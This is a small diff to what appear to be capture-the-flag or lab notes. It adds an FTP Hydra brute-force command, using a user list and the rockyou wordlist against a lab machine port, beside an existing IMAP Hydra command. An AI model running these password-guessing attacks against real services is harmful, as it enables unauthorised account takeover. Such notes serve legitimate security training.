@@ -9,3 +9,6 @@
 ## IMAP 
 
      hydra -l lazie -P /usr/share/wordlists/rockyou.txt -f 10.10.236.254 imap -v
+
+## FTP 
+    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -vV ftp://[MACHINE_IP]:10021
